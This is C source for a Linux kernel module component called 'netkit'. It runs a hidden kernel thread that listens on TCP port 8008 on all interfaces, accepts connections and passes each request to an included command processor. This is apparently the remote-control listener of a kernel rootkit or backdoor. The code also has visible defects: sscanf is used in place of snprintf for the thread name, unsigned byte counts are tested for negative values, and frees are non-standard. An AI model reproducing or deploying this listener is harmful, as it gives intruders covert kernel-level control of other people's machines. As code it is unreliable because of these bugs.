#include <linux/types.h>
#include <linux/kthread.h>
#include <linux/freezer.h>
#include <linux/sched.h>
#include <linux/errno.h>
#include <linux/random.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/net.h>
#include <linux/delay.h>

#include "server.h"

#include "../../core/cmd/cmd.h"
#include "../../core/packet/packet.h"
#include "../../mutex.h"
#include "../../mem/mngt.h"

#define SERVER_IP "0.0.0.0"
#define SERVER_PORT 8008

#define KTHREAD_LOOP_NAME "netkit-loop"

static struct task_struct *task_loop = NULL;

static struct socket *server_get_socket(const char* server_ip, unsigned short server_port)
{
    static struct socket *sock;
    struct sockaddr_in addr;
    int err;

    // allocate IPv4/TCP socket
	err = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (err != 0) {
        pr_err("[!] failed to create socket: %d\n", err);
        return ERR_PTR(err);
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = in_aton(server_ip);
    addr.sin_port = htons(server_port);

    err = kernel_bind(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (err < 0) {
        pr_err("[!] failed to bind socket: %d\n", err);
        sock_release(sock);

        return ERR_PTR(err);
    }

    return sock;
}

static size_t server_read(struct socket *sk_client, u8* req_buf, size_t req_buflen)
//static size_t server_read(void *conn, u8* buf, size_t buflen)
{
    //struct socket *sk_client = ((server_conn_t*)conn)->sk_client;
	struct msghdr msg;
	struct kvec vec;
    size_t count;

    pr_err("[*] req_buflen: %lu\n", req_buflen);
    memset(&msg, '\x00', sizeof(msg));

    vec.iov_base = req_buf;
    vec.iov_len = req_buflen;

    count = kernel_recvmsg(sk_client, &msg, &vec, 1, req_buflen, 0);
    if (count < 0) {
        pr_err("[!] sock_recvmsg() failed (err: %lu)\n", count);
    }

    pr_err("[+] read %lu bytes\n", count);

    return count;
}

static size_t server_write(const server_packet_t *packet, u8 *req_buf, size_t req_buflen)
{
	struct msghdr msg;
	struct kvec vec = {
        .iov_base = req_buf,
        .iov_len = req_buflen
    };
    int count;

    memset(&msg, '\x00', sizeof(msg));

    //vec.iov_base = req_buf;
    //vec.iov_len = req_buflen;

    count = kernel_sendmsg(packet->client_sk, &msg, &vec, 1, req_buflen);
    if (count < 0) {
        pr_err("[!] sock_recvmsg() failed (err: %d)\n", count);
    }

    return count;
}

static int server_conn_handler(void *args)
{
    server_packet_t *packet = (server_packet_t*)args;
    u8* res_buf = NULL;
    size_t res_buflen = 0;
    int retv;

    pr_err("[*] calling io_process (req_buflen: %lu)...\n", packet->req_buflen);
    retv = io_process(packet->req_buf, packet->req_buflen, &res_buf, &res_buflen);
    pr_err("[*] sending response to client (res_buflen: %lu)...\n", res_buflen);
    retv = server_write(packet, res_buf, res_buflen);
    
    sock_release(packet->client_sk);
    kzfree(packet->req_buf, sizeof(packet->req_buf));
    kzfree(packet, sizeof(*packet));
    kzfree(res_buf, res_buflen);
    
    return retv;
}

/**
 * Listens to connections, parses the packet and starts packet processing
 */
static int server_conn_loop(void* args)
{
    char kthread_name[29];  // strlen("netkit-conn-handler-") + 8 + 1
    unsigned int kthread_name_id;
    struct task_struct *conn_task;
    struct socket *server_sk;
    struct socket *client_sk;
    server_packet_t *packet;
    int conn_retv;
    int retv = 0;

    server_sk = server_get_socket(SERVER_IP, SERVER_PORT);
    if (IS_ERR(server_sk))
    {
        pr_err("[!] failed to get socket (err: %ld)\n", PTR_ERR(server_sk));
        retv = PTR_ERR(server_sk);
        goto LAB_OUT_NO_SOCK;
    }

    retv = server_sk->ops->listen(server_sk, 10);
    if (retv < 0)
    {
        pr_err("[!] failed to listen on socket (err: %d)\n", retv);
        goto LAB_OUT;
    }

    pr_err("[+] started listening for connections\n");
    
    while (!kthread_should_stop())
    {
        pr_err("[*] checking for connection...\n");

		if (try_to_freeze())
			continue;

        conn_retv = kernel_accept(server_sk, &client_sk, SOCK_NONBLOCK);
        if (conn_retv < 0) {
			if (conn_retv == -EAGAIN)
				schedule_timeout_interruptible(HZ / 10);  // 50ms check rate
            continue;
        }

        pr_err("[+] received connection\n");

        packet = kzmalloc(sizeof(*packet), GFP_KERNEL);
        if (!packet)
            goto LAB_CONN_OUT_NO_PACKET;

        packet->client_sk = client_sk;
        packet->req_buf = kzmalloc(MAX_SERVER_PACKET_SIZE, GFP_KERNEL);
        if (!packet->req_buf)
            goto LAB_CONN_OUT_NO_REQBUF;

        packet->req_buflen = server_read(packet->client_sk, packet->req_buf, MAX_SERVER_PACKET_SIZE);
        if (packet->req_buflen < 0)
        {
            pr_err("[!] failed to read bytes from connection\n");
            goto LAB_CONN_OUT;
        }

        kthread_name_id = (int)get_random_long();
        sscanf(kthread_name, "netkit-conn-handler-%08x", &kthread_name_id);

        pr_err("[+] starting server conn handler\n");

        // child should kfree(content_len) and kfree(content_len->content)
        conn_task = kthread_run(server_conn_handler, packet, kthread_name);

        if (IS_ERR(conn_task))
        {
            pr_err("[!] failed to start handler\n");
            goto LAB_CONN_OUT;
        }

        continue;

LAB_CONN_OUT:
        kzfree(packet->req_buf, MAX_SERVER_PACKET_SIZE);
LAB_CONN_OUT_NO_REQBUF:
        kzfree(packet, sizeof(*packet));
        packet = NULL;
LAB_CONN_OUT_NO_PACKET:
        sock_release(client_sk);
        client_sk = NULL;
    }

    pr_err("[*] received kthread_stop. quitting...\n");

LAB_OUT:
    sock_release(server_sk);
LAB_OUT_NO_SOCK:
    return retv;
}

int server_kthread_stop_existing(const char *name)
{
    int retv = 0;

    pr_err("[*] stopping server...\n");

    retv = kthread_stop_by_name(name);
    if (likely(retv == -ESRCH)) {
        pr_err("[-] no existing proc found\n");
        return 0;
    } else if (unlikely(retv >= 0))
        pr_err("[+] successfully terminated existing proc\n");

    return retv;
}

/**
 * Initializes the kthread for the server
 * Return: 0 if successful
 */
static int server_init(void)
{
    int retv = 0;

    pr_err("[*] starting server_conn_loop...\n");

    task_loop = kthread_run(server_conn_loop, NULL, KTHREAD_LOOP_NAME);
    if (IS_ERR(task_loop))
        return PTR_ERR(task_loop);
    
    return retv;
}

static int server_exit(void)
{
    int retv;

    if (!task_loop)
    {
        pr_err("[!] task loop does not exist when exiting\n");
        return -ECHILD;
    }

    retv = kthread_stop(task_loop);
    if (retv < 0)
        pr_err("[!] kthread returned error\n");

    return retv;
}

const struct io_ops IO_SERVER_OPS = {
    .init = server_init,
    .exit = server_exit
};